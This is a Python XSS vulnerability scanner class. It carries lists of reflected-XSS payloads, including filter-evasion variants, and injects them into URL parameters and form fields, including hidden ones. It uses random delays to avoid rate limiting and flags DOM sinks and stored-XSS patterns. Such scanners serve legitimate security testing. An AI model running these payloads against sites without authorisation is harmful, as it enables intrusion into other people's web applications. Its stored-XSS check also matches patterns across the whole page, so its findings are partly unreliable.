import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import re
import time
import random
import html
from bs4 import BeautifulSoup
import difflib

class XSSScanner:
    def __init__(self):
        # Basic XSS payloads
        self.basic_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src='javascript:alert(`XSS`)'></iframe>",
            "javascript:alert('XSS')",
            "<div style='width:expression(alert(\"XSS\"));'>",
            "<img src=1 href=1 onerror=\"javascript:alert('XSS')\"></img>",
            "<audio src=1 href=1 onerror=\"javascript:alert('XSS')\"></audio>",
            "<video src=1 href=1 onerror=\"javascript:alert('XSS')\"></video>",
            "<body src=1 href=1 onerror=\"javascript:alert('XSS')\"></body>",
            "<image src=1 href=1 onerror=\"javascript:alert('XSS')\"></image>",
            "<object src=1 href=1 onerror=\"javascript:alert('XSS')\"></object>",
            "<script src=1 href=1 onerror=\"javascript:alert('XSS')\"></script>",
            "<svg onResize svg onResize=\"javascript:javascript:alert('XSS')\"></svg onResize>",
            "<title onPropertyChange title onPropertyChange=\"javascript:javascript:alert('XSS')\"></title onPropertyChange>",
            "<iframe onLoad iframe onLoad=\"javascript:javascript:alert('XSS')\"></iframe onLoad>",
            "<body onMouseEnter body onMouseEnter=\"javascript:javascript:alert('XSS')\"></body onMouseEnter>",
            "<body onFocus body onFocus=\"javascript:javascript:alert('XSS')\"></body onFocus>",
            "<input onFocus=javascript:alert('XSS')>",
            "<input autofocus onFocus=javascript:alert('XSS')>",
            "<input onfocus=javascript:alert('XSS') autofocus>",
            "<select onfocus=javascript:alert('XSS') autofocus>",
            "<textarea onfocus=javascript:alert('XSS') autofocus>",
            "<keygen onfocus=javascript:alert('XSS') autofocus>",
            "<div/onmouseover='alert(1)'> style='x:'",
            "<--`<img/src=` onerror=alert('XSS')> --!>",
            "<script/src='data:text/javascript,alert(1)'></script>",
            "<svg><script>alert('XSS')</script></svg>",
            "'\"><script>alert('XSS')</script>",
            "'\"><img src=x onerror=alert('XSS')>",
            "'\"><svg onload=alert('XSS')>"
        ]
        
        # Advanced XSS payloads for filter evasion
        self.advanced_payloads = [
            # HTML entity encoding
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            
            # JavaScript encoding
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
            "<script>\\u0061\\u006C\\u0065\\u0072\\u0074('XSS')</script>",
            
            # URL encoding
            "<script>document.write(unescape('%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E'))</script>",
            
            # Mixed case to bypass case-sensitive filters
            "<ScRiPt>alert('XSS')</sCrIpT>",
            "<ImG sRc=x OnErRoR=alert('XSS')>",
            
            # No quotes and semicolons
            "<script>alert(1)</script>",
            "<script>alert`XSS`</script>",
            
            # Exotic JavaScript
            "<script>({})['constructor']['constructor']('alert(\"XSS\")')();</script>",
            "<script>(()=>{})['constructor']('alert(\"XSS\")')();</script>",
            
            # DOM-based XSS
            "<a href=\"javascript:eval(atob('YWxlcnQoJ1hTUycpOw=='))\">Click me</a>",
            
            # Event handlers
            "<svg/onload=alert('XSS')>",
            "<body/onload=alert('XSS')>",
            "<marquee/onstart=alert('XSS')>",
            
            # CSS-based
            "<div style=\"background-image: url(javascript:alert('XSS'))\">",
            "<div style=\"behavior: url(javascript:alert('XSS'))\">",
            "<style>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</style>",
            
            # Protocol handlers
            "<a href=\"javascript:alert('XSS')\">Click me</a>",
            "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\">Click me</a>",
            
            # Unusual tags
            "<math><mi xlink:href=\"data:x,<script>alert(1)</script>\">",
            "<math><maction actiontype=\"statusline#\" xlink:href=\"javascript:alert(2)\">Click</maction></math>"
        ]
        
        # Combine all payloads
        self.payloads = self.basic_payloads + self.advanced_payloads
        
        # Patterns to detect successful XSS execution
        self.xss_patterns = [
            r"<script[^>]*>.*?</script>",
            r"<img[^>]*onerror[^>]*>",
            r"<svg[^>]*onload[^>]*>",
            r"javascript:alert",
            r"<[^>]*on[a-z]+\s*=",
            r"<iframe[^>]*src[^>]*javascript:",
            r"<[^>]*style[^>]*expression[^>]*>",
            r"<[^>]*behavior[^>]*url[^>]*>",
            r"<[^>]*data:text/html[^>]*>",
            r"<[^>]*xlink:href[^>]*javascript:",
            r"<[^>]*actiontype[^>]*xlink:href[^>]*javascript:"
        ]
        
    def scan(self, url, options=None):
        """Scan a URL for XSS vulnerabilities with enhanced detection"""
        vulnerabilities = []
        options = options or {}
        
        # Set timeout based on options or use default
        timeout = options.get('timeout', 15)  # Increased from 10 to 15
        thorough = options.get('thorough', False)
        
        # Use baseline response if provided
        baseline_response = options.get('baseline_response')
        
        # Set user agent
        headers = {
            'User-Agent': options.get('user_agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36')
        }
        
        # Check if URL has parameters
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        
        # If thorough mode, also check for hidden parameters
        if thorough and not params:
            # Try common parameter names to discover hidden parameters
            common_params = ['q', 'search', 'id', 'page', 'query', 'keyword', 'term', 'text', 'content', 'data']
            for param in common_params:
                test_url = f"{url}{'&' if '?' in url else '?'}{param}=test"
                try:
                    response = requests.get(test_url, timeout=timeout, headers=headers)
                    # If response is different from baseline, we might have found a parameter
                    if baseline_response and self._compare_responses(baseline_response.text, response.text) < 0.95:
                        # Add this parameter to our test list
                        parsed_test_url = urlparse(test_url)
                        params = parse_qs(parsed_test_url.query)
                        break
                except Exception as e:
                    print(f"Error testing parameter discovery on {url}: {str(e)}")
        
        if not params:
            # Try to find forms on the page
            try:
                if baseline_response:
                    response = baseline_response
                else:
                    response = requests.get(url, timeout=timeout, headers=headers)
                    
                # Extract forms from the page
                forms = self._extract_forms(response.text)
                
                # Also look for potential DOM-based XSS
                dom_vulnerabilities = self._check_dom_xss(url, response.text)
                vulnerabilities.extend(dom_vulnerabilities)
                
                # Test each form
                for form in forms:
                    # In thorough mode, test with more payloads
                    if thorough:
                        form_vulnerabilities = self._test_form(url, form, self.payloads, timeout, headers)
                    else:
                        # Use a subset of payloads for faster testing
                        form_vulnerabilities = self._test_form(url, form, self.basic_payloads[:15], timeout, headers)
                        
                    vulnerabilities.extend(form_vulnerabilities)
                    
            except Exception as e:
                print(f"Error fetching {url}: {str(e)}")
                
            return vulnerabilities
            
        # Get baseline response if not already provided
        if not baseline_response:
            try:
                baseline_response = requests.get(url, timeout=timeout, headers=headers)
            except Exception as e:
                print(f"Error fetching baseline for {url}: {str(e)}")
                return vulnerabilities
        
        # Test each parameter in the URL
        for param in params:
            # Select payloads based on thoroughness
            test_payloads = self.payloads if thorough else self.basic_payloads
            
            for payload in test_payloads:
                # Add random delay between requests to avoid rate limiting
                if thorough:
                    time.sleep(random.uniform(0.3, 0.7))
                    
                # Create a new set of parameters with the payload
                new_params = params.copy()
                new_params[param] = [payload]
                
                # Rebuild the URL with the new parameters
                query_string = urlencode(new_params, doseq=True)
                new_url = urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    query_string,
                    parsed_url.fragment
                ))
                
                # Send the request
                try:
                    response = requests.get(new_url, timeout=timeout, headers=headers)
                    
                    # Enhanced detection of XSS vulnerabilities
                    self._analyze_xss_response(url, param, payload, response.text, baseline_response.text, vulnerabilities)
                    
                    # If we found a vulnerability, move to the next parameter
                    if any(v['parameter'] == param for v in vulnerabilities):
                        break
                
                except Exception as e:
                    print(f"Error testing {url} with payload {payload}: {str(e)}")
        
        # Look for stored XSS by checking if any payloads appear in the baseline response
        self._check_stored_xss(url, baseline_response.text, vulnerabilities)
        
        return vulnerabilities
    
    def _analyze_xss_response(self, url, param, payload, response_text, baseline_text, vulnerabilities):
        """Analyze response for XSS vulnerabilities with enhanced detection"""
        # Check if the payload is reflected in the response
        if payload in response_text and payload not in baseline_text:
            # Check if the payload is within HTML tags or attributes
            soup = BeautifulSoup(response_text, 'html.parser')
            html_text = str(soup)
            
            # Determine if the payload is in a potentially executable context
            is_executable = False
            
            # Check if the payload appears in script tags
            script_tags = soup.find_all('script')
            for script in script_tags:
                if payload in str(script):
                    is_executable = True
                    break
            
            # Check if the payload appears in event handlers
            for pattern in self.xss_patterns:
                if re.search(pattern, html_text, re.IGNORECASE):
                    is_executable = True
                    break
            
            # Check if the payload is within an attribute that could execute JavaScript
            for tag in soup.find_all():
                for attr_name, attr_value in tag.attrs.items():
                    if isinstance(attr_value, str) and payload in attr_value:
                        if attr_name.startswith('on') or attr_name in ['src', 'href', 'style'] and 'javascript:' in attr_value:
                            is_executable = True
                            break
            
            # Determine confidence level
            confidence = 'High' if is_executable else 'Medium'
            
            vulnerabilities.append({
                'type': 'Reflected XSS',
                'url': url,
                'parameter': param,
                'payload': payload,
                'evidence': f'Payload reflected in response in {"executable" if is_executable else "non-executable"} context',
                'severity': 'High',
                'description': 'Reflected Cross-Site Scripting (XSS) vulnerability detected. The application appears to be vulnerable to XSS attacks.',
                'remediation': 'Implement proper output encoding and input validation. Consider using Content-Security-Policy headers and X-XSS-Protection header.',
                'confidence': confidence
            })
            return True
        
        # Check for partial reflections or encoding
        encoded_payload = html.escape(payload)
        if encoded_payload in response_text and encoded_payload not in baseline_text:
            vulnerabilities.append({
                'type': 'Potential Reflected XSS (HTML-encoded)',
                'url': url,
                'parameter': param,
                'payload': payload,
                'evidence': f'HTML-encoded payload reflected in response',
                'severity': 'Medium',
                'description': 'Potential Reflected XSS vulnerability detected with HTML encoding. The application reflects user input after HTML encoding, which may still be vulnerable in certain contexts.',
                'remediation': 'Implement proper output encoding and input validation. Consider using Content-Security-Policy headers and X-XSS-Protection header.',
                'confidence': 'Medium'
            })
            return True
        
        # Check for URL-encoded reflections
        url_encoded_payload = payload.replace('<', '%3C').replace('>', '%3E')
        if url_encoded_payload in response_text and url_encoded_payload not in baseline_text:
            vulnerabilities.append({
                'type': 'Potential Reflected XSS (URL-encoded)',
                'url': url,
                'parameter': param,
                'payload': payload,
                'evidence': f'URL-encoded payload reflected in response',
                'severity': 'Medium',
                'description': 'Potential Reflected XSS vulnerability detected with URL encoding. The application reflects user input after URL encoding, which may still be vulnerable in certain contexts.',
                'remediation': 'Implement proper output encoding and input validation. Consider using Content-Security-Policy headers and X-XSS-Protection header.',
                'confidence': 'Medium'
            })
            return True
        
        return False
    
    def _check_dom_xss(self, url, html_content):
        """Check for potential DOM-based XSS vulnerabilities"""
        vulnerabilities = []
        
        # Look for common DOM XSS sinks
        dom_sinks = [
            'document.write(',
            'document.writeln(',
            'innerHTML',
            'outerHTML',
            'insertAdjacentHTML',
            'eval(',
            'setTimeout(',
            'setInterval(',
            'location',
            'location.href',
            'location.replace(',
            'location.assign(',
            'document.location',
            'document.URL',
            'document.documentURI',
            'document.URLUnencoded',
            'document.baseURI',
            'document.referrer',
            'window.name',
            'history.pushState(',
            'history.replaceState(',
            'localStorage',
            'sessionStorage'
        ]
        
        # Look for common DOM XSS sources
        dom_sources = [
            'location',
            'location.href',
            'location.search',
            'location.hash',
            'document.URL',
            'document.documentURI',
            'document.referrer',
            'window.name',
            'localStorage',
            'sessionStorage'
        ]
        
        # Check for sinks in JavaScript code
        script_tags = re.findall(r'<script[^>]*>(.*?)</script>', html_content, re.DOTALL | re.IGNORECASE)
        
        for script in script_tags:
            # Check for sinks
            for sink in dom_sinks:
                if sink in script:
                    # Check if any source is used with this sink
                    for source in dom_sources:
                        if source in script and source in script[:script.find(sink)]:
                            vulnerabilities.append({
                                'type': 'Potential DOM-based XSS',
                                'url': url,
                                'parameter': 'N/A (DOM)',
                                'payload': 'N/A (DOM)',
                                'evidence': f'DOM XSS sink ({sink}) used with source ({source})',
                                'severity': 'High',
                                'description': 'Potential DOM-based Cross-Site Scripting vulnerability detected. The application appears to use user-controlled input in a DOM manipulation sink.',
                                'remediation': 'Sanitize and validate all user input before using it in DOM manipulation. Consider using safe DOM APIs like textContent instead of innerHTML.',
                                'confidence': 'Medium'
                            })
        
        # Check for event handlers that use location or document.URL
        event_handlers = re.findall(r'on\w+\s*=\s*["\']([^"\']*)["\']', html_content, re.IGNORECASE)
        for handler in event_handlers:
            for source in dom_sources:
                if source in handler:
                    vulnerabilities.append({
                        'type': 'Potential DOM-based XSS',
                        'url': url,
                        'parameter': 'N/A (DOM)',
                        'payload': 'N/A (DOM)',
                        'evidence': f'Event handler using DOM XSS source ({source})',
                        'severity': 'High',
                        'description': 'Potential DOM-based Cross-Site Scripting vulnerability detected. The application appears to use user-controlled input in an event handler.',
                        'remediation': 'Sanitize and validate all user input before using it in event handlers. Consider using safe DOM APIs.',
                        'confidence': 'Medium'
                    })
        
        return vulnerabilities
    
    def _check_stored_xss(self, url, html_content, vulnerabilities):
        """Check for potential stored XSS vulnerabilities"""
        # Look for common XSS patterns in the page content
        for pattern in self.xss_patterns:
            matches = re.findall(pattern, html_content, re.IGNORECASE)
            for match in matches:
                # Skip matches that are likely part of the legitimate page content
                if any(safe_pattern in match.lower() for safe_pattern in ['jquery', 'bootstrap', 'google', 'analytics']):
                    continue
                    
                vulnerabilities.append({
                    'type': 'Potential Stored XSS',
                    'url': url,
                    'parameter': 'N/A (Stored)',
                    'payload': 'N/A (Stored)',
                    'evidence': f'Suspicious content found: {match[:50]}...',
                    'severity': 'High',
                    'description': 'Potential Stored Cross-Site Scripting vulnerability detected. The application appears to be displaying potentially malicious content that could execute JavaScript.',
                    'remediation': 'Implement proper output encoding for all user-generated content. Consider using Content-Security-Policy headers.',
                    'confidence': 'Low'  # Low confidence since we can't be sure it's actually exploitable
                })
        
        return vulnerabilities
    
    def _compare_responses(self, response1, response2):
        """Compare two responses and return similarity ratio"""
        # Clean HTML to focus on content
        soup1 = BeautifulSoup(response1, 'html.parser')
        soup2 = BeautifulSoup(response2, 'html.parser')
        
        text1 = soup1.get_text()
        text2 = soup2.get_text()
        
        # Calculate similarity ratio
        matcher = difflib.SequenceMatcher(None, text1, text2)
        return matcher.ratio()
    
    def _extract_forms(self, html):
        """Extract forms from HTML content with enhanced detection"""
        soup = BeautifulSoup(html, 'html.parser')
        forms = []
        
        for form in soup.find_all('form'):
            form_details = {}
            form_details['action'] = form.get('action', '')
            form_details['method'] = form.get('method', 'get').lower()
            form_details['enctype'] = form.get('enctype', 'application/x-www-form-urlencoded')
            form_details['inputs'] = []
            
            # Get all input fields including hidden ones for more thorough testing
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                input_type = input_tag.get('type', 'text')
                input_name = input_tag.get('name', '')
                
                # Include all inputs except submit buttons
                if input_name and input_type != 'submit':
                    form_details['inputs'].append({
                        'type': input_type,
                        'name': input_name,
                        'value': input_tag.get('value', ''),
                        'required': input_tag.has_attr('required'),
                        'max_length': input_tag.get('maxlength', ''),
                        'pattern': input_tag.get('pattern', '')
                    })
            
            # Also check for custom inputs like div with contenteditable
            for editable in soup.find_all(attrs={"contenteditable": "true"}):
                if editable.get('id') or editable.get('name'):
                    form_details['inputs'].append({
                        'type': 'contenteditable',
                        'name': editable.get('id') or editable.get('name'),
                        'value': editable.text,
                        'required': False,
                        'max_length': '',
                        'pattern': ''
                    })
            
            forms.append(form_details)
        
        return forms
    
    def _test_form(self, base_url, form, payloads=None, timeout=15, headers=None):
        """Test a form for XSS vulnerabilities with enhanced detection"""
        vulnerabilities = []
        headers = headers or {}
        payloads = payloads or self.payloads
        
        # Determine the form submission URL
        action = form['action']
        if not action:
            action = base_url
        elif not action.startswith(('http://', 'https://')):
            # Relative URL
            parsed_url = urlparse(base_url)
            action = f"{parsed_url.scheme}://{parsed_url.netloc}{action}"
        
        # Get baseline response
        baseline_data = {}
        for field in form['inputs']:
            # Skip file inputs as they require different handling
            if field['type'] == 'file':
                continue
            baseline_data[field['name']] = field['value'] or 'test'
        
        try:
            if form['method'] == 'post':
                baseline_response = requests.post(action, data=baseline_data, timeout=timeout, headers=headers)
            else:
                baseline_response = requests.get(action, params=baseline_data, timeout=timeout, headers=headers)
        except Exception as e:
            print(f"Error fetching baseline for form at {action}: {str(e)}")
            return vulnerabilities
        
        # Test each input field
        for input_field in form['inputs']:
            # Skip file inputs as they require different handling
            if input_field['type'] == 'file':
                continue
                
            # Test with different payloads
            for payload in payloads:
                # Add random delay between requests to avoid rate limiting
                time.sleep(random.uniform(0.2, 0.5))
                
                # Prepare the form data
                data = {}
                for field in form['inputs']:
                    if field['type'] == 'file':
                        continue
                    if field['name'] == input_field['name']:
                        data[field['name']] = payload
                    else:
                        data[field['name']] = field['value'] or 'test'
                
                try:
                    # Submit the form
                    if form['method'] == 'post':
                        response = requests.post(action, data=data, timeout=timeout, headers=headers)
                    else:
                        response = requests.get(action, params=data, timeout=timeout, headers=headers)
                    
                    # Enhanced detection of XSS vulnerabilities
                    if self._analyze_xss_response(action, input_field['name'], payload, response.text, baseline_response.text, vulnerabilities):
                        break  # Found a vulnerability with this input, move to the next one
                
                except Exception as e:
                    print(f"Error testing form at {action} with payload {payload}: {str(e)}")
            
            # Check for DOM-based XSS in form handlers
            try:
                # Look for JavaScript event handlers in the form
                form_html = str(BeautifulSoup(baseline_response.text, 'html.parser').find('form', action=form['action']))
                if form_html:
                    dom_vulnerabilities = self._check_form_dom_xss(action, form_html, input_field['name'])
                    vulnerabilities.extend(dom_vulnerabilities)
            except Exception as e:
                print(f"Error checking DOM XSS in form at {action}: {str(e)}")
        
        return vulnerabilities
    
    def _check_form_dom_xss(self, url, form_html, input_name):
        """Check for potential DOM-based XSS vulnerabilities in form handlers"""
        vulnerabilities = []
        
        # Look for event handlers that might use the input value
        event_handlers = re.findall(r'on\w+\s*=\s*["\']([^"\']*)["\']', form_html, re.IGNORECASE)
        
        for handler in event_handlers:
            # Check if the handler contains references to form elements or input values
            if re.search(r'(getElementById|getElementsByName|querySelector|value|innerHTML|outerHTML)', handler, re.IGNORECASE):
                vulnerabilities.append({
                    'type': 'Potential DOM-based XSS (Form)',
                    'url': url,
                    'parameter': input_name,
                    'payload': 'N/A (DOM)',
                    'evidence': f'Form event handler: {handler[:50]}...',
                    'severity': 'High',
                    'description': 'Potential DOM-based Cross-Site Scripting vulnerability detected in a form. The form contains event handlers that may use user input in an unsafe way.',
                    'remediation': 'Sanitize and validate all user input before using it in DOM manipulation. Consider using safe DOM APIs like textContent instead of innerHTML.',
                    'confidence': 'Medium'
                })
        
        # Look for inline JavaScript that might handle form submission
        script_tags = re.findall(r'<script[^>]*>(.*?)</script>', form_html, re.DOTALL | re.IGNORECASE)
        
        for script in script_tags:
            # Check if the script references the form or its inputs
            if re.search(r'(getElementById|getElementsByName|querySelector|form|submit|value|innerHTML|outerHTML)', script, re.IGNORECASE):
                vulnerabilities.append({
                    'type': 'Potential DOM-based XSS (Form Script)',
                    'url': url,
                    'parameter': input_name,
                    'payload': 'N/A (DOM)',
                    'evidence': f'Form script: {script[:50]}...',
                    'severity': 'High',
                    'description': 'Potential DOM-based Cross-Site Scripting vulnerability detected in a form. The form contains JavaScript that may use user input in an unsafe way.',
                    'remediation': 'Sanitize and validate all user input before using it in DOM manipulation. Consider using safe DOM APIs like textContent instead of innerHTML.',
                    'confidence': 'Low'
                })
        
        return vulnerabilities